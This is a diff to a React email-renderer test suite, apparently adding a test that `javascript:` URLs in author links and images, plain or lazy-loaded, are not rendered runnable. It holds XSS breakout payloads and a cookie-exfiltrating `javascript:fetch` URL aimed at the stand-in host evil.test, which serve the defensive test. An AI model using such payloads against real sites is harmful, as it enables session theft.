@@ -21,6 +21,7 @@ import { Tailwind, loadTailwind, type TailwindHandle } from "../tailwind";
 import { CLASS_LIMITS } from "../tailwind/declarations";
 import { Markdown } from "../markdown";
 import { growth, inTime, within } from "../test-timing";
+import * as asyncRenderers from "../async";
 
 const PAYLOADS = [
   '"><x-pwn></x-pwn>', "'><x-pwn></x-pwn>", '" x-pwn="1', "' x-pwn='1", "</p></div></td></tr></table><x-pwn></x-pwn>",
@@ -318,6 +319,27 @@ describe("a link's `javascript:` URL, as data gives it", () => {
       const design = renderToJson(<Email><Row><Column><Button href={url}>Go</Button></Column></Row></Email>);
       expect(design.body.rows[0].columns[0].contents[0].values.href.values.href).toBe(url);
     }
+  });
+
+  it.each(Object.entries(ROOTS))("%s: in markup a component of yours renders runs nothing, in a lazy one's too (React renders it itself) with React 18 too", async (_, Root) => {
+    // (A profile's website, from data, in an author line.)
+    const Author = ({ url }: { url: string }) => (
+      <p>
+        By <a href={url}>Mallory</a> <img src={url} alt="" />
+      </p>
+    );
+    const LazyAuthor = React.lazy(() => ({ then: (done: (m: { default: typeof Author }) => void) => done({ default: Author }) }) as Promise<{ default: typeof Author }>);
+    for (const url of [...URLS, "javascript:fetch('https://evil.test/?c='+document.cookie)"]) {
+      for (const Shown of [Author, LazyAuthor]) {
+        const template = <Root><Row><Column><Shown url={url} /><Paragraph>By <Shown url={url} /></Paragraph></Column></Row></Root>;
+        const links = [...urls(renderToHtml(template)), ...urls(await asyncRenderers.renderToHtml(template))];
+        expect(links.length, url).toBeGreaterThan(0);
+        expect([url, Shown === Author ? "plain" : "lazy", links.filter(runs)]).toEqual([url, Shown === Author ? "plain" : "lazy", []]);
+      }
+    }
+    // (The negative control: a URL that isn't one, kept.)
+    const kept = "https://example.com/?a=1&b=2";
+    expect(urls(renderToHtml(<Root><Row><Column><LazyAuthor url={kept} /></Column></Row></Root>))).toEqual([kept, kept]);
   });
 
   it("is written as react-dom 19 writes it, a URL that throws, where a Button's link would run", () => {
